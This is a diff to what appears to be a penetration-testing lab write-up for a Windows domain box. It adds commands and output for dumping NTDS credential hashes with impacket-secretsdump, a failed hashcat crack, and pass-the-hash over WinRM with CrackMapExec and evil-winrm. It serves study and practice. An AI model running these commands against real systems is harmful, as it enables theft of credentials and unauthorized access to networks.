@@ -134,11 +134,9 @@ mget *
 ### Secrets Dump
 
 ```
-impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL -outputfile hashes.txt
-
+impacket-secretsdump -ntds ntds.dit -system SYSTEM -sam SAM LOCAL | tee secrets
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
-[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Searching for pekList, be patient
 [*] PEK # 0 found and decrypted: 9298735ba0d788c4fc05528650553f94
@@ -202,8 +200,10 @@ G.Goldberg:des-cbc-md5:3e20fd1a25687673
 
 Output:
 
+* Copy the Kerberos hashes only and place them into a file called hashes.txt
+
 ```
-cat hashes.txt.ntds
+cat hashes.txt
 
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
@@ -221,10 +221,67 @@ D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:
 G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
 ```
 
-### Port 88 - Kerberos
+### Cracking with Hashcat
 
-* AS-REP Roasting
-* Kerberoasting
+```
+.\hashcat.exe -m 1000 hashes.txt .\rockyou.txt
+```
+
+* However, rockyou was unable to crack any hashes
+* Let's see if we can pass the hash (PTH)!
+* <mark style="color:yellow;">First, let's seperate the users and hashes into two separate files</mark>
+
+<mark style="color:yellow;">users.txt</mark>:
+
+```
+cat secrets | cut -d":" -f1 | tee users.txt
+
+cat users.txt 
+
+Administrator
+Guest
+RESOURCEDC$
+krbtgt
+M.Mason
+K.Keen
+L.Livingstone
+J.Johnson
+V.Ventz
+S.Swanson
+P.Parker
+R.Robinson
+D.Durant
+G.Goldberg
+```
+
+<mark style="color:yellow;">hashes.txt</mark>:
+
+```
+cat secrets | cut -d":" -f4 | tee hashes.txt
+```
+
+
+
+### Passing The Hash with CrackMapExec
+
+{% code overflow="wrap" %}
+```
+crackmapexec winrm 192.168.81.175 -u users.txt -H hashes.txt
+
+WINRM       192.168.81.175  5985   RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 (Pwn3d!)
+```
+{% endcode %}
+
+* We get a pwn3d user!
+* <mark style="color:yellow;">L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808</mark>
+
+### Evil-WinRM
+
+```
+evil-winrm resourced.local -u l.livingston -H 19a3a7550ce8c505c2d46b5e39d6f808
+```
+
+<figure><img src="../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
 
 ## Exploitation
 
